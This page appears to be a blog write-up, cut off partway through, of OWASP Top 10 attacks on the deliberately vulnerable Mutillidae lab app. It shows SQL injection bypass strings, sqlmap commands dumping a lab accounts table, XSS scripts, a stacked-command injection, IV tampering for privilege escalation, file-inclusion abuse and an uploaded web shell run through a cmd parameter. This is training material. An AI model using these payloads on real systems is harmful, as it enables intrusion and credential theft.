
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>OWASP Top 10 in Mutillidae (Part 1) - /home/mislusnys</title>
  <meta name="author" content="Mindaugas Slusnys">

  
  <meta name="description" content="Intro OWASP Mutillidae II is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiast. It features &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://mislusnys.github.io/blog/2015/02/03/owasp-top-10-in-mutillidae/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="/home/mislusnys" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">/home/mislusnys</a></h1>
  
    <h2>Information Security Research</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:mislusnys.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">OWASP Top 10 in Mutillidae (Part 1)</h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-02-03T10:48:16-05:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


<div class="entry-content"><h2>Intro</h2>

<p><em>OWASP Mutillidae II</em> is a free, open source, deliberately vulnerable web-application providing a target for web-security enthusiast. It features many vulnerabilities and challenges.
Contains at least one vulnerability for each of the <em>OWASP Top Ten</em>.</p>

<!--more-->


<p>For this writeup Mutillidae version 2.6.17 inside XAMPP (Windows 7) was used (<em>Security Level: 0</em>).</p>

<p>The OWASP Top 10 - 2013 is as follows:</p>

<ul>
<li><em>A1 Injection</em></li>
<li><em>A2 Broken Authentication and Session Management</em></li>
<li><em>A3 Cross-Site Scripting (XSS)</em></li>
<li><em>A4 Insecure Direct Object References</em></li>
<li><em>A5 Security Misconfiguration</em></li>
<li><em>A6 Sensitive Data Exposure</em></li>
<li><em>A7 Missing Function Level Access Control</em></li>
<li><em>A8 Cross-Site Request Forgery (CSRF)</em></li>
<li><em>A9 Using Components with Known Vulnerabilities</em></li>
<li><em>A10 Unvalidated Redirects and Forwards</em></li>
</ul>


<h2>A1 Injection</h2>

<p>Injection flaws, such as SQL, OS, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization.</p>

<h3>SQL Injections</h3>

<p>The first SQL injection is in the login page. If we input single quote as password and try to login, the app conveniently shows us the SQL query (in the error message):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">accounts</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;&#39;</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="err">&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can see that both username and password fields should be injectable. We can use that information to login as any user. Using username <code>admin'-- -</code> and any password or username <code>admin</code> and password <code>' or 1=1-- -</code> we can login as admin.</p>

<p><img src="/images/2015/02/03/admin.png"></p>

<p>There&rsquo;s another SQL injection in the <code>view-someones-blog.php</code> page. Let&rsquo;s use <code>burp</code> and <code>sqlmap</code> to automate the exploitation. First we intercept the HTTP request with burp and save it to a file:</p>

<p><img src="/images/2015/02/03/request.png"></p>

<p>Then we can use the request file with sqlmap and extract data from the database(s):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">sqlmap</span> <span class="o">-</span><span class="n">r</span> <span class="o">~/</span><span class="n">request</span> <span class="c1">--dbs</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="p">[</span><span class="mi">05</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span> <span class="k">is</span> <span class="n">MySQL</span>
</span><span class='line'><span class="n">web</span> <span class="n">server</span> <span class="n">operating</span> <span class="k">system</span><span class="p">:</span> <span class="n">Windows</span>
</span><span class='line'><span class="n">web</span> <span class="n">application</span> <span class="n">technology</span><span class="p">:</span> <span class="n">PHP</span> <span class="mi">5</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">3</span><span class="p">,</span> <span class="n">Apache</span> <span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">10</span>
</span><span class='line'><span class="n">back</span><span class="o">-</span><span class="k">end</span> <span class="n">DBMS</span><span class="p">:</span> <span class="n">MySQL</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span>
</span><span class='line'><span class="p">[</span><span class="mi">05</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="k">database</span> <span class="k">names</span>
</span><span class='line'><span class="n">available</span> <span class="n">databases</span> <span class="p">[</span><span class="mi">8</span><span class="p">]:</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cdcol</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">information_schema</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">mysql</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">nowasp</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">performance_schema</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">phpmyadmin</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">test</span>
</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">webauth</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can dump user account data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">Database</span><span class="p">:</span> <span class="n">nowasp</span>
</span><span class='line'><span class="k">Table</span><span class="p">:</span> <span class="n">accounts</span>
</span><span class='line'><span class="p">[</span><span class="mi">23</span> <span class="n">entries</span><span class="p">]</span>
</span><span class='line'><span class="o">+</span><span class="c1">-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="n">cid</span> <span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">lastname</span>      <span class="o">|</span> <span class="n">is_admin</span> <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">firstname</span> <span class="o">|</span> <span class="n">mysignature</span>                             <span class="o">|</span>
</span><span class='line'><span class="o">+</span><span class="c1">-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+</span>
</span><span class='line'><span class="o">|</span> <span class="mi">9</span>   <span class="o">|</span> <span class="n">simba</span>    <span class="o">|</span> <span class="n">Lion</span>          <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">Simba</span>     <span class="o">|</span> <span class="n">I</span> <span class="n">am</span> <span class="n">a</span> <span class="n">super</span><span class="o">-</span><span class="n">cat</span>                        <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">8</span>   <span class="o">|</span> <span class="n">bobby</span>    <span class="o">|</span> <span class="n">Hill</span>          <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">Bobby</span>     <span class="o">|</span> <span class="n">Hank</span> <span class="k">is</span> <span class="n">my</span> <span class="n">dad</span>                          <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">7</span>   <span class="o">|</span> <span class="n">jim</span>      <span class="o">|</span> <span class="n">Rome</span>          <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">Jim</span>       <span class="o">|</span> <span class="n">Rome</span> <span class="k">is</span> <span class="n">burning</span>                         <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">6</span>   <span class="o">|</span> <span class="n">samurai</span>  <span class="o">|</span> <span class="n">WTF</span>           <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">samurai</span>      <span class="o">|</span> <span class="n">Samurai</span>   <span class="o">|</span> <span class="n">Carving</span> <span class="n">fools</span>                           <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">5</span>   <span class="o">|</span> <span class="n">bryce</span>    <span class="o">|</span> <span class="n">Galbraith</span>     <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">Bryce</span>     <span class="o">|</span> <span class="n">I</span> <span class="n">Love</span> <span class="n">SANS</span>                             <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">4</span>   <span class="o">|</span> <span class="n">jeremy</span>   <span class="o">|</span> <span class="n">Druin</span>         <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">Jeremy</span>    <span class="o">|</span> <span class="n">d1373</span> <span class="mi">1337</span> <span class="n">speak</span>                        <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">3</span>   <span class="o">|</span> <span class="n">john</span>     <span class="o">|</span> <span class="n">Pentest</span>       <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">monkey</span>       <span class="o">|</span> <span class="n">John</span>      <span class="o">|</span> <span class="n">I</span> <span class="k">like</span> <span class="n">the</span> <span class="n">smell</span> <span class="k">of</span> <span class="n">confunk</span>             <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">2</span>   <span class="o">|</span> <span class="n">adrian</span>   <span class="o">|</span> <span class="n">Crenshaw</span>      <span class="o">|</span> <span class="k">TRUE</span>     <span class="o">|</span> <span class="n">somepassword</span> <span class="o">|</span> <span class="n">Adrian</span>    <span class="o">|</span> <span class="n">Zombie</span> <span class="n">Films</span> <span class="n">Rock</span><span class="o">!</span>                      <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">23</span>  <span class="o">|</span> <span class="n">ed</span>       <span class="o">|</span> <span class="n">Skoudis</span>       <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">pentest</span>      <span class="o">|</span> <span class="n">Ed</span>        <span class="o">|</span> <span class="n">Commandline</span> <span class="n">KungFu</span> <span class="n">anyone</span><span class="o">?</span>              <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">22</span>  <span class="o">|</span> <span class="n">james</span>    <span class="o">|</span> <span class="n">Jardine</span>       <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">3</span><span class="n">devs</span>      <span class="o">|</span> <span class="n">James</span>     <span class="o">|</span> <span class="n">Occupation</span><span class="p">:</span> <span class="n">Researcher</span>                  <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">21</span>  <span class="o">|</span> <span class="n">CHook</span>    <span class="o">|</span> <span class="n">Hook</span>          <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">JollyRoger</span>   <span class="o">|</span> <span class="n">Captain</span>   <span class="o">|</span> <span class="n">Gator</span><span class="o">-</span><span class="n">hater</span>                             <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">20</span>  <span class="o">|</span> <span class="n">PPan</span>     <span class="o">|</span> <span class="n">Pan</span>           <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">NotTelling</span>   <span class="o">|</span> <span class="n">Peter</span>     <span class="o">|</span> <span class="k">Where</span> <span class="k">is</span> <span class="n">Tinker</span><span class="o">?</span>                        <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">1</span>   <span class="o">|</span> <span class="k">admin</span>    <span class="o">|</span> <span class="n">Administrator</span> <span class="o">|</span> <span class="k">TRUE</span>     <span class="o">|</span> <span class="n">adminpass</span>    <span class="o">|</span> <span class="k">System</span>    <span class="o">|</span> <span class="n">g0t</span> <span class="n">r00t</span><span class="o">?</span>                               <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">19</span>  <span class="o">|</span> <span class="n">ABaker</span>   <span class="o">|</span> <span class="n">Baker</span>         <span class="o">|</span> <span class="k">TRUE</span>     <span class="o">|</span> <span class="n">SoSecret</span>     <span class="o">|</span> <span class="n">Aaron</span>     <span class="o">|</span> <span class="n">Muffin</span> <span class="n">tops</span> <span class="k">only</span>                        <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">18</span>  <span class="o">|</span> <span class="n">tim</span>      <span class="o">|</span> <span class="n">Tomes</span>         <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">lanmaster53</span>  <span class="o">|</span> <span class="n">Tim</span>       <span class="o">|</span> <span class="n">Because</span> <span class="n">reconnaissance</span> <span class="k">is</span> <span class="n">hard</span> <span class="k">to</span> <span class="n">spell</span> <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">17</span>  <span class="o">|</span> <span class="n">rocky</span>    <span class="o">|</span> <span class="n">Paws</span>          <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">stripes</span>      <span class="o">|</span> <span class="n">Rocky</span>     <span class="o">|</span> <span class="n">treats</span><span class="o">?</span>                                 <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">16</span>  <span class="o">|</span> <span class="n">patches</span>  <span class="o">|</span> <span class="n">Pester</span>        <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">tortoise</span>     <span class="o">|</span> <span class="n">Patches</span>   <span class="o">|</span> <span class="n">meow</span>                                    <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">15</span>  <span class="o">|</span> <span class="n">dave</span>     <span class="o">|</span> <span class="n">Kennedy</span>       <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="k">set</span>          <span class="o">|</span> <span class="n">Dave</span>      <span class="o">|</span> <span class="n">Bet</span> <span class="k">on</span> <span class="n">S</span><span class="p">.</span><span class="n">E</span><span class="p">.</span><span class="n">T</span><span class="p">.</span> <span class="n">FTW</span>                       <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">14</span>  <span class="o">|</span> <span class="n">kevin</span>    <span class="o">|</span> <span class="n">Johnson</span>       <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="mi">42</span>           <span class="o">|</span> <span class="n">Kevin</span>     <span class="o">|</span> <span class="n">Doug</span> <span class="n">Adams</span> <span class="n">rocks</span>                        <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">13</span>  <span class="o">|</span> <span class="n">john</span>     <span class="o">|</span> <span class="n">Wall</span>          <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">John</span>      <span class="o">|</span> <span class="k">Do</span> <span class="n">the</span> <span class="n">Duggie</span><span class="o">!</span>                          <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">12</span>  <span class="o">|</span> <span class="n">cal</span>      <span class="o">|</span> <span class="n">Calipari</span>      <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">John</span>      <span class="o">|</span> <span class="k">C</span><span class="o">-</span><span class="n">A</span><span class="o">-</span><span class="n">T</span><span class="o">-</span><span class="n">S</span> <span class="n">Cats</span> <span class="n">Cats</span> <span class="n">Cats</span>                  <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">11</span>  <span class="o">|</span> <span class="n">scotty</span>   <span class="o">|</span> <span class="n">Evil</span>          <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">Scotty</span>    <span class="o">|</span> <span class="n">Scotty</span> <span class="k">do</span>                               <span class="o">|</span>
</span><span class='line'><span class="o">|</span> <span class="mi">10</span>  <span class="o">|</span> <span class="n">dreveil</span>  <span class="o">|</span> <span class="n">Evil</span>          <span class="o">|</span> <span class="k">FALSE</span>    <span class="o">|</span> <span class="n">password</span>     <span class="o">|</span> <span class="n">Dr</span><span class="p">.</span>       <span class="o">|</span> <span class="n">Preparation</span> <span class="n">H</span>                           <span class="o">|</span>
</span><span class='line'><span class="o">+</span><span class="c1">-----+----------+---------------+----------+--------------+-----------+-----------------------------------------+</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Other Injections</h3>

<h4>HTML/Javascript Injection</h4>

<p>These injections occur when user input ends up in a generated web page and is treated as code rather than text.
In the <code>browser-info.php</code> page we can see information about our browser, such as User-Agent, Referrer, cookie information, etc.
If we modify User-Agent string (via browser add-ons or burp) to be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;User Agent injection!&#39;</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can see that it becomes part of the page code:</p>

<p><img src="/images/2015/02/03/ua.png"></p>

<p>It is actually displayed two times, because it is included in two different places within the page.</p>

<h4>Command Injection</h4>

<p><img src="/images/2015/02/03/dns.png"></p>

<p>In this page the user input is intended to a shell command&rsquo;s argument. However, most shells support stacked commands and if user input is not sanitized, we can execute additional commands in the context of the web server.
In Linux we can add additional commands with <code>;</code> and in Windows with <code>&amp;</code> or <code>&amp;&amp;</code>:</p>

<pre><code>&amp; dir
</code></pre>

<p>will result in:</p>

<p><img src="/images/2015/02/03/dir.png"></p>

<!--
#### XML Injection
-->


<h2>A2 Broken Authentication and Session Management</h2>

<p>Application functions related to authentication and session management are often not implemented correctly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities.</p>

<p>Mutillidae has a page called &ldquo;View User Privilege Level&rdquo; where an attacker can escalate to root privileges by attacking a weak encryption mechanism.</p>

<p><img src="/images/2015/02/03/priv.png"></p>

<p>This page has a default http parameter <code>iv=6bc24fc1ab650b25b4114e93a98f1eba</code> which somehow encodes the 3 ids shown in the picture.
By changing various bytes in the <code>iv</code> parameter we can change the values displayed on the page. After a few tries we can see that <strong>5th</strong> and <strong>8th</strong> byte directly correspond to the first chars of <code>UID</code> and <code>GID</code>.
With the value <em>6bc24fc1</em><strong>00</strong><em>650b</em><strong>00</strong><em>b4114e93a98f1eba</em>,
we have <code>0x9a</code> and <code>0x14</code> as first <code>UID</code> and <code>GID</code> chars respectively. Normally we could use burp to brute force the values (256 + 256 tries), but here simple <code>XOR</code> is used, so we
can do it by hand. We are looking for values that <code>XOR</code> with <code>0x9a</code> and <code>0x14</code> and produce <code>0x30</code>. Since <code>XOR</code> is communicative, we can calculate:</p>

<pre><code>0x9A XOR 0x30 = 0xAA
0x14 XOR 0x30 = 0x24
</code></pre>

<p>Using <em>6bc24fc1</em><strong>aa</strong><em>650b</em><strong>24</strong><em>b4114e93a98f1eba</em> value we get:</p>

<p><img src="/images/2015/02/03/root.png"></p>

<h2>A3 Cross-Site Scripting (XSS)</h2>

<p>XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</p>

<p>XSS can be either <em>Reflected (First Order)</em> or <em>Persistent (Second Order)</em>. Reflected XSS requires a victim to visit maliciously crafted URL, while the more dangerous persistent XSS gets stored on the server and is executed each time the vulnerable page is loaded. On the <code>add-to-your-blog.php</code> page a user can create a new blog post. This page contains a persistent XSS vulnerability. If we create a blog post with this code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Malicious blog post!&quot;</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then upon viewing the blog post the victim&rsquo;s browser will execute the malicious code:</p>

<p><img src="/images/2015/02/03/xss.png"></p>

<h2>A4 Insecure Direct Object References</h2>

<p>A direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, or database key. Without an access control check or other protection, attackers can manipulate these references to access unauthorized data.</p>

<p>Mutillidae contains a few <em>Local File Inclusion (LFI)</em> vulnerabilities. One is in the <code>arbitrary-file-inclusion.php</code> page.</p>

<pre><code>http://192.168.1.66/mutillidae/index.php?page=arbitrary-file-inclusion.php
</code></pre>

<p>Here any file specified in the <code>page</code> variable gets included in the current page. This allows attacker to execute any php file present on the web server or view contents of sensitive non php files (logs, configuration, etc.).
In some cases this vulnerability allows to include remote php files (<em>Remote File Inclusion</em>), however, newer PHP configurations disable this by default.</p>

<p>Another vulnerable page is <code>text-file-viewer.php</code>. This page allows us to view text files from a remote server, by selecting them from a drop-down list.
However, if intercept the request with burp and change <code>textfile</code> variable, we can view the source code of any
web server files. We can view the source code of the current page:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">try</span> <span class="p">{</span>           
</span><span class='line'>  <span class="k">switch</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;security-level&quot;</span><span class="p">]){</span>
</span><span class='line'>              <span class="k">case</span> <span class="s2">&quot;0&quot;</span><span class="o">:</span> <span class="c1">// This code is insecure</span>
</span><span class='line'>              <span class="k">case</span> <span class="s2">&quot;1&quot;</span><span class="o">:</span> <span class="c1">// This code is insecure</span>
</span><span class='line'>          <span class="nv">$lUseTokenization</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
</span><span class='line'>          <span class="nv">$lEncodeOutput</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
</span><span class='line'>          <span class="nv">$lProtectAgainstMethodTampering</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>          
</span><span class='line'>      <span class="k">case</span> <span class="s2">&quot;2&quot;</span><span class="o">:</span>
</span><span class='line'>      <span class="k">case</span> <span class="s2">&quot;3&quot;</span><span class="o">:</span>
</span><span class='line'>      <span class="k">case</span> <span class="s2">&quot;4&quot;</span><span class="o">:</span>
</span><span class='line'>          <span class="k">case</span> <span class="s2">&quot;5&quot;</span><span class="o">:</span> <span class="c1">// This code is fairly secure</span>
</span><span class='line'>          <span class="nv">$lUseTokenization</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span><span class='line'>          <span class="nv">$lEncodeOutput</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span><span class='line'>          <span class="nv">$lProtectAgainstMethodTampering</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span><span class="c1">// end switch ($_SESSION[&quot;security-level&quot;])</span>
</span><span class='line'><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">){</span>
</span><span class='line'>  <span class="k">echo</span> <span class="nv">$CustomErrorHandler</span><span class="o">-&gt;</span><span class="na">FormatError</span><span class="p">(</span><span class="nv">$e</span><span class="p">,</span> <span class="s2">&quot;Error in text file viewer. Cannot load file.&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="c1">// end try</span>
</span><span class='line'><span class="o">...</span>
</span></code></pre></td></tr></table></div></figure>


<h2>A5 Security Misconfiguration</h2>

<p>Good security requires having a secure configuration defined and deployed for the application, frameworks, application server, web server, database server, and platform. Secure settings should be defined, implemented, and maintained, as defaults are often insecure. Additionally, software should be kept up to date.</p>

<p>Most common security misconfiguration is relying on &ldquo;hidden&rdquo; directories and files. The only security here being the assumption that the attacker will not find out the names of such resources, because they have no links to them
from the main pages. However, these names can be guessed or brute forced. We have a few of them in our web server. World accessible <em>passwords</em> folder:</p>

<p><img src="/images/2015/02/03/pass.png"></p>

<p>Or <em>data</em> folder:</p>

<p><img src="/images/2015/02/03/data.png"></p>

<p>Another common misconfiguration is unrestricted file upload. Most of the time files containing executable code (php, asp, js, etc.) are not allowed. However, if restrictions are implemented badly or not present at all, then attacker
can execute code on the server via file upload:</p>

<p><img src="/images/2015/02/03/upload.png"></p>

<p>After uploading the shell, we can browse to it and execute commands on the server:</p>

<pre><code>http://192.168.1.66/mutillidae/upload/shell.php?cmd=dir
</code></pre>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">Volume</span> <span class="nx">in</span> <span class="nx">drive</span> <span class="nx">C</span> <span class="nx">has</span> <span class="nx">no</span> <span class="nx">label</span><span class="o">.</span> <span class="nx">Volume</span> <span class="nx">Serial</span> <span class="nx">Number</span> <span class="nx">is</span> <span class="nx">E2B8</span><span class="o">-</span><span class="mi">4</span><span class="nx">C80</span> <span class="nx">Directory</span> <span class="nx">of</span> <span class="nx">C</span><span class="o">:</span><span class="nx">\xampp\htdocs\mutillidae\upload</span> <span class="mo">02</span><span class="o">/</span><span class="mo">05</span><span class="o">/</span><span class="mi">2015</span> <span class="mi">11</span><span class="o">:</span><span class="mi">24</span> <span class="nx">AM</span>
